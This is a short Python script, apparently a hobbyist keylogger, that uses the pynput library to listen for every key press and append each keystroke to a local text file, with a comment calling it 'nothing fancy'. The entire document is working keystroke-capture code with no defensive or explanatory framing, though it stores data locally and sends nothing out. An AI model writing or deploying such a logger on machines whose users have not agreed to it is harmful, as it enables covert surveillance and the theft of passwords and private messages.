# Nothing fancy. Catch keystrokes and write a file continously

from pynput import keyboard

OUT_FILE='keloggs.txt'

def _writer(stroke):
     with open(OUT_FILE, 'a') as catcher:
             catcher.write(str(stroke))

with keyboard.Listener(on_press=_writer) as l:
    l.join()
